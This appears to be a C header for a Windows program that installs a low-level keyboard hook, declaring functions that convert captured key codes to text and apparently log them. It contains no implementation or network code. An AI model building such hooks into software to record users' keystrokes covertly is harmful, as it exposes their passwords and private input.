#ifndef _HOOK_H_
#define _HOOK_H_

#define _WIN32_WINNT 0x0400

#include "log.h"

#include <stdlib.h>

#pragma comment(lib, "User32.lib")


void hookConvertCode(char *sCode, DWORD vkCode);
LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l);
int hookInit();
int hookDestroy();
void hookMessage();
void hookVirtualKey();


#endif // _HOOK_H_